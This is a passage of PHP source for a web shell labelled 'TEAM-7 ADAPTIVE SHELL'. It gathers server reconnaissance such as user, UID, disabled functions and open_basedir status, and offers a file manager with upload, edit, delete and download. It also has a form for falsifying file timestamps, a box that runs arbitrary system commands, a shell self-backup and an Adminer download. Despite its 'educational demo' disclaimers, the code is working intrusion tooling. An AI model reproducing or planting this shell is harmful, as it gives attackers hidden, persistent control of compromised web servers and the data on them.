            if ($named && preg_match_all('/zone\s+"([^"]+)"/', $named, $zones)) {
                echo implode(', ', $zones[1]) . "<br>";
            } else {
                echo $_SERVER['SERVER_NAME'] . "<br>";
            }
            
            // IP Address
            echo "🌐 <b>IP Address</b>: " . gethostbyname(gethostname()) . "<br>";
            
            // Current User
            echo "👤 <b>User</b>: " . get_current_user() . " (UID: " . getmyuid() . ")<br>";
            
            // PHP Version & Safe Mode
            echo "⚙️ <b>PHP Version</b>: " . phpversion() . " | ";
            echo "Safe Mode: <span class='badge " . (ini_get('safe_mode') ? "off" : "on") . "'>" . 
                 (ini_get('safe_mode') ? "ON" : "OFF") . "</span><br>";
            
            // Disk Usage
            $total = disk_total_space(".");
            $free = disk_free_space(".");
            $used = $total - $free;
            echo "📂 <b>Disk Usage</b>: " . round($used / 1024 / 1024 / 1024, 2) . "GB / " . 
                 round($total / 1024 / 1024 / 1024, 2) . "GB<br>";
            
            // RAM Usage (Linux only)
            $mem = @file_get_contents("/proc/meminfo");
            if ($mem) {
                preg_match('/MemTotal:\s+(\d+)/', $mem, $total_mem);
                preg_match('/MemAvailable:\s+(\d+)/', $mem, $avail_mem);
                if ($total_mem && $avail_mem) {
                    $used_mem = $total_mem[1] - $avail_mem[1];
                    echo "🧠 <b>RAM Usage</b>: " . round($used_mem / 1024) . "MB / " . 
                         round($total_mem[1] / 1024) . "MB<br>";
                }
            }
            
            // Disabled Functions
            $disabled = @ini_get('disable_functions');
            echo '<div style="margin-top:10px;">';
            echo '🧨 <b>Disabled Functions</b>: ';
            echo $disabled 
                ? '<span style="color:#f00;word-break:break-word;">' . htmlspecialchars($disabled) . '</span>' 
                : '<span style="color:#0f0;">None</span>';
            echo '</div>';
            
            // Module Check
            function check_func($f) { 
                return is_callable($f) && stripos(@ini_get('disable_functions'), $f) === false; 
            }
            
            echo "<br>🔄 <b>Modules</b>: ";
            echo '<span class="badge ' . (check_func("curl_exec") ? "on" : "off") . '">cURL</span> ';
            echo '<span class="badge ' . (extension_loaded("ssh2") ? "on" : "off") . '">SSH2</span> ';
            echo '<span class="badge ' . ((function_exists("mysql_connect") || function_exists("mysqli_connect")) ? "on" : "off") . '">MySQL</span> ';
            echo '<span class="badge ' . (function_exists("pg_connect") ? "on" : "off") . '">PostgreSQL</span> ';
            echo '<span class="badge ' . (function_exists("oci_connect") ? "on" : "off") . '">Oracle</span> ';
            echo '<span class="badge ' . (class_exists('ZipArchive') ? "on" : "off") . '">ZipArchive</span>';
            
            // Restrictions
            echo "<br><br>🛡️ <b>Restrictions</b>: ";
            $open_basedir = ini_get('open_basedir');
            $is_restricted = (!empty($open_basedir) && strtolower($open_basedir) != 'none');
            echo "open_basedir: <b style='color:" . ($is_restricted ? '#0f0' : '#f33') . "'>" . 
                 ($is_restricted ? 'ON' : 'OFF') . "</b>";
            ?>
        </div>
        
        <!-- Logo -->
        <div style="flex:1 1 35%;text-align:center;margin-top:-20px;">
            <img src="https://raw.githubusercontent.com/santanamichigan/imunifychallenger/refs/heads/main/TEAM-17.png" 
                 alt="Team-7" style="max-height:200px;opacity:0.9;">
            <div style="font-size:11px;color:#aaa;margin-top:5px;">
                TEAM-7 ADAPTIVE SHELL<br>
                Educational Demo Version
            </div>
        </div>
    </div>
</div>
<hr>

<script>
function toggleInfo() {
    var info = document.getElementById("sysinfo");
    var btn = document.getElementById("toggleBtn");
    if (info.style.display === "none") {
        info.style.display = "block";
        btn.innerHTML = "🧩 Hide System Info";
    } else {
        info.style.display = "none";
        btn.innerHTML = "🧩 Show System Info";
    }
}
</script>

<!-- Current Path Navigation -->
<div style="margin:10px 0;display:flex;align-items:center;justify-content:space-between;">
    <div>
        <span class="badge on">PWD →</span> 
        <?php
        $parts = explode($ds, $cwd);
        $build = '';
        
        foreach ($parts as $i => $p) {
            if ($p == '' && $i == 0) {
                $build = $ds;
                echo '<a href="?id=' . getPathId($build) . '">☢</a>';
                continue;
            }
            if ($p == '') continue;
            
            $build .= ($build == $ds ? '' : $ds) . $p;
            echo $ds . '<a href="?id=' . getPathId($build) . '">' . htmlspecialchars($p) . '</a>';
        }
        ?>
    </div>
    <div>
        <a href="?id=<?= getPathId(dirname(__FILE__)); ?>">
            <button style="font-size:11px;padding:4px 10px;">[ Home File ]</button>
        </a>
    </div>
</div>
<hr>

<?php
// Show backup form if triggered
if (!empty($show_backup_form)) {
    echo "<div style='text-align:center;margin-top:10px;'>";
    echo "<form method='post' style='display:inline-block;'>";
    echo "<input type='text' name='backup_name' placeholder='Backup filename...' style='width:220px;margin-right:5px;' required>";
    echo "<button type='submit' name='do_backup'>OK</button>";
    echo "<a href='?id=" . getPathId($cwd) . "'><button type='button'>CANCEL</button></a>";
    echo "</form></div><hr>";
}

// Show rename form
if (isset($_GET['rename']) && $_GET['rename'] != '') {
    $old = basename($_GET['rename']);
    echo '<div style="text-align:center;">
    <div style="margin-bottom:10px;font-weight:bold;color:#ffffff;font-size:16px;">' . htmlspecialchars($old) . '</div>
    <form method="POST" style="display:inline;">
    <input type="hidden" name="oldname" value="' . htmlspecialchars($old) . '">
    <input type="text" name="newname" placeholder="New name..." style="width:200px;" required>
    <button type="submit">OK</button> 
    <a href="?id=' . getPathId($cwd) . '"><button type="button">CANCEL</button></a>
    </form></div><hr>';
}

// Show touch form
if (isset($_GET['touch']) && $_GET['touch'] != '') {
    $target = basename($_GET['touch']);
    echo '<div style="text-align:center;">
    <div style="margin-bottom:10px;font-weight:bold;color:#ffffff;font-size:16px;">' . htmlspecialchars($target) . '</div>
    <form method="POST" style="display:inline;">
    <input type="hidden" name="touchfile" value="' . htmlspecialchars($target) . '">
    <input type="text" name="touchtime" placeholder="YYYY-MM-DD HH:MM:SS" style="width:220px;" required>
    <button type="submit">OK</button>
    <a href="?id=' . getPathId($cwd) . '"><button type="button">CANCEL</button></a>
    </form></div><hr>';
}

// Display notifications
if ($notif != '') {
    echo '<div style="text-align:center;margin-bottom:10px;">' . $notif . '<hr style="width:50%;border:1px solid #444;"></div>';
}

// Show file editor
if (isset($_GET['edit']) && $_GET['edit'] != '') {
    $edit = basename($_GET['edit']);
    $target = $cwd . $ds . $edit;
    
    if (is_file($target)) {
        $content = @file_get_contents($target);
        $ext = pathinfo($edit, PATHINFO_EXTENSION);
        
        // Determine CodeMirror mode
        $mode_map = array(
            'php' => 'application/x-httpd-php',
            'html' => 'htmlmixed',
            'htm' => 'htmlmixed',
            'js' => 'javascript',
            'json' => 'javascript',
            'css' => 'css',
            'xml' => 'xml',
            'py' => 'python',
            'sh' => 'shell',
            'bash' => 'shell',
            'c' => 'text/x-csrc',
            'cpp' => 'text/x-c++src',
            'java' => 'text/x-java',
        );
        
        $mode = isset($mode_map[$ext]) ? $mode_map[$ext] : 'text/plain';
        
        echo '<div style="margin:10px auto; max-width: 1200px;">';
        echo '<form method="POST">';
        echo '<input type="hidden" name="savefile" value="' . htmlspecialchars($edit) . '">';
        echo '<div style="margin-bottom:10px; font-weight:bold; color:#ffffff; font-size:16px; text-align:center;">' . 
             htmlspecialchars($edit) . '</div>';
        echo '<textarea id="editor" name="filecontent">' . htmlspecialchars($content) . '</textarea>';
        echo '<div style="text-align:center; margin-top:10px;">';
        echo '<button type="submit">💾 SAVE</button> ';
        echo '<a href="?id=' . getPathId($cwd) . '"><button type="button">❌ CANCEL</button></a>';
        echo '</div>';
        echo '</form></div><hr>';
        
        echo "<script>
        var editor = CodeMirror.fromTextArea(document.getElementById('editor'), {
            mode: '$mode',
            theme: 'ayu-mirage',
            lineNumbers: true,
            indentUnit: 4,
            matchBrackets: true,
            lineWrapping: true
        });
        editor.setSize('100%', '500px');
        </script>";
    }
}
// Show info page
elseif (isset($_GET['info'])) {
    echo '<div style="text-align:center;margin-top:20px;">';
    echo '<img src="https://raw.githubusercontent.com/santanamichigan/imunifychallenger/main/TEAM-17.png" style="max-height:200px;opacity:0.9;"><br>';
    echo '<div style="color:#ccc;font-size:16px;margin-top:10px;font-family:monospace;">TEAM-7 File Manager<br>';
    echo '<small style="color:#999;">Educational Analysis Version</small></div>';
    echo '<div style="margin-top:20px;color:#888;max-width:600px;margin-left:auto;margin-right:auto;text-align:left;">';
    echo '<h3 style="color:#0f0;">Features:</h3>';
    echo '<ul>';
    echo '<li>✓ Full file manager (Windows + Linux)</li>';
    echo '<li>✓ Code editor with syntax highlighting</li>';
    echo '<li>✓ Command execution</li>';
    echo '<li>✓ File upload/download</li>';
    echo '<li>✓ ZIP creation</li>';
    echo '<li>✓ Timestamp modification</li>';
    echo '<li>✓ Adminer integration</li>';
    echo '<li>✓ Backup functionality</li>';
    echo '</ul>';
    echo '<h3 style="color:#f00;margin-top:20px;">⚠️ WARNING:</h3>';
    echo '<p>This is a DECODED shell for educational purposes ONLY. Never use on production servers!</p>';
    echo '</div>';
    echo '<div style="margin-top:15px;"><a href="?id=' . getPathId($cwd) . '"><button>Back to Files</button></a></div>';
    echo '</div><hr>';
}
// Show file listing
else {
    ?>
    <div class="table-container">
        <table>
            <thead>
                <tr>
                    <th>Name</th>
                    <th>Size</th>
                    <th>Modified</th>
                    <th>Owner:Group</th>
                    <th>Permission</th>
                    <th>Action</th>
                </tr>
            </thead>
            <tbody>
                <?php
                // FIXED: Enhanced directory reading with error handling
                $folders = array();
                $files_list = array();
                
                $items = @scandir($cwd);
                if ($items !== false) {
                    foreach ($items as $file) {
                        if ($file == '.' || $file == '..') continue;
                        
                        $path = $cwd . $ds . $file;
                        
                        if (@is_dir($path)) {
                            $folders[] = $file;
                        } elseif (@is_file($path)) {
                            $files_list[] = $file;
                        }
                    }
                } else {
                    echo '<tr><td colspan="6" style="text-align:center;color:#f00;">Cannot read directory</td></tr>';
                }
                
                // Sort arrays
                sort($folders);
                sort($files_list);
                
                // Display folders
                foreach ($folders as $file) {
                    $path = $cwd . $ds . $file;
                    $perm = perm($path);
                    
                    $class = '';
                    if (@is_writable($path)) $class = 'perm-write';
                    elseif (@is_readable($path)) $class = 'perm-read';
                    else $class = 'perm-none';
                    
                    echo '<tr class="folder-row">';
                    echo '<td>📁 <a href="?id=' . getPathId($path) . '">' . htmlspecialchars($file) . '</a></td>';
                    echo '<td>DIR</td>';
                    echo '<td>' . date("Y-m-d H:i:s", @filemtime($path)) . '</td>';
                    echo '<td>' . get_owner_group($path) . '</td>';
                    echo '<td class="' . $class . '">' . $perm . '</td>';
                    echo '<td>';
                    echo '<form method="POST" style="display:inline;" onsubmit="return confirm(\'Delete folder: ' . htmlspecialchars($file) . '?\')">
                          <input type="hidden" name="del" value="' . htmlspecialchars($file) . '">
                          <button type="submit" style="font-size:11px;">Delete</button></form> ';
                    echo '<a href="?id=' . getPathId($cwd) . '&rename=' . urlencode($file) . '">
                          <button type="button" style="font-size:11px;">Rename</button></a> ';
                    echo '<a href="?id=' . getPathId($cwd) . '&zip=' . urlencode($file) . '">
                          <button type="button" style="font-size:11px;">ZIP</button></a>';
                    echo '</td>';
                    echo '</tr>';
                }
                
                // Display files
                foreach ($files_list as $file) {
                    $path = $cwd . $ds . $file;
                    $size = @filesize($path);
                    $perm = perm($path);
                    
                    $class = '';
                    if (@is_writable($path)) $class = 'perm-write';
                    elseif (@is_readable($path)) $class = 'perm-read';
                    else $class = 'perm-none';
                    
                    echo '<tr class="file-row">';
                    echo '<td>📄 <a href="?id=' . getPathId($cwd) . '&edit=' . urlencode($file) . '">' . 
                         htmlspecialchars($file) . '</a></td>';
                    echo '<td>' . format_size($size) . '</td>';
                    echo '<td>' . date("Y-m-d H:i:s", @filemtime($path)) . '</td>';
                    echo '<td>' . get_owner_group($path) . '</td>';
                    echo '<td class="' . $class . '">' . $perm . '</td>';
                    echo '<td>';
                    echo '<form method="POST" style="display:inline;" onsubmit="return confirm(\'Delete file: ' . htmlspecialchars($file) . '?\')">
                          <input type="hidden" name="del" value="' . htmlspecialchars($file) . '">
                          <button type="submit" style="font-size:11px;">Delete</button></form> ';
                    echo '<a href="?id=' . getPathId($cwd) . '&rename=' . urlencode($file) . '">
                          <button type="button" style="font-size:11px;">Rename</button></a> ';
                    echo '<a href="?id=' . getPathId($cwd) . '&download=' . urlencode($file) . '">
                          <button type="button" style="font-size:11px;">Download</button></a> ';
                    echo '<a href="?id=' . getPathId($cwd) . '&touch=' . urlencode($file) . '">
                          <button type="button" style="font-size:11px;">Touch</button></a>';
                    echo '</td>';
                    echo '</tr>';
                }
                ?>
            </tbody>
        </table>
    </div>
    <hr>
    <?php
}
?>

<div style="text-align:center;margin-top:20px;">
    <form method="POST" style="display:inline-block;">
        <input type="text" name="cmd" placeholder="Command (e.g., whoami, ls -la, pwd)..." style="width:500px;padding:8px;">
        <button type="submit">⚡ EXECUTE</button>
    </form>
</div>

<?php
if (isset($_POST['cmd']) && $_POST['cmd'] != '') {
    $cmd = $_POST['cmd'];
    $start_time = microtime(true);
    
    // Execute using adaptive executor
    $result = $executor->execute($cmd);
    
    $exec_time = round((microtime(true) - $start_time) * 1000, 2);
    
    echo '<div class="cmd-output">';
    echo '<span style="color:#0ff;">$ ' . htmlspecialchars($cmd) . '</span>' . "\n\n";
    
    if ($result['success']) {
        echo htmlspecialchars($result['output']);
    } else {
        echo '<span style="color:#f00;">' . htmlspecialchars($result['output']) . '</span>';
    }
    
    echo '</div>';
    
    echo '<div class="cmd-meta">';
    echo '<strong>📊 Execution Info:</strong> ';
    echo 'Method: <span style="color:#0f0;">' . htmlspecialchars($result['method']) . '</span> | ';
    echo 'Attempts: <span style="color:#ff0;">' . $result['attempts'] . '</span> | ';
    echo 'Time: <span style="color:#0ff;">' . $exec_time . 'ms</span> | ';
    echo 'Status: <span style="color:' . ($result['success'] ? '#0f0' : '#f00') . ';">' . 
         ($result['success'] ? '✅ SUCCESS' : '❌ FAILED') . '</span>';
    if (isset($result['cached']) && $result['cached']) {
        echo ' | <span style="color:#ff0;">⚡ CACHED - TEAM7</span>';
    }
    echo '</div>';
    echo '<hr>';
}
?>

<!-- File Upload & Create -->
<div style="margin-top:20px;text-align:center;">
    <!-- Upload Form -->
    <form method="POST" enctype="multipart/form-data" style="display:inline;margin-right:15px;">
        <input type="file" name="upfile" style="margin-right:5px;">
        <button type="submit" name="upload">⬆️ UPLOAD</button>
    </form>
    
    <!-- Create Form -->
    <form method="POST" style="display:inline;">
        <input type="text" name="name" placeholder="Name..." style="width:200px;" required>
        <select name="action" style="padding:5px;">
            <option value="file">📄 File</option>
            <option value="folder">📁 Folder</option>
        </select>
        <button type="submit" name="create">➕ CREATE</button>
    </form>
</div>

<!-- Bottom Actions -->
<div style="margin-top:20px;text-align:center;">
    <form method="POST" style="display:inline;margin-right:10px;">
        <button type="submit" name="backup_trigger">💾 Backup Shell</button>
    </form>
    
    <form method="POST" style="display:inline;margin-right:10px;">
        <button type="submit" name="adminer_trigger">🗄️ Download Adminer</button>
    </form>
    
    <form method="GET" style="display:inline;">
        <input type="hidden" name="info" value="1">
        <button type="submit">ℹ️ Info</button>
    </form>
</div>

<!-- Footer -->
<div style="text-align:center;margin-top:30px;padding-top:20px;border-top:1px solid #444;color:#666;font-size:11px;">
    TEAM-7 ADAPTIVE SHELL — Educational Demo Version — <?= date('Y'); ?><br>
    <span style="color:#f00;">⚠️ FOR SECURITY DEMONSTRATION ONLY - NEVER USE ON PRODUCTION! ⚠️</span>
</div>

</body>
</html>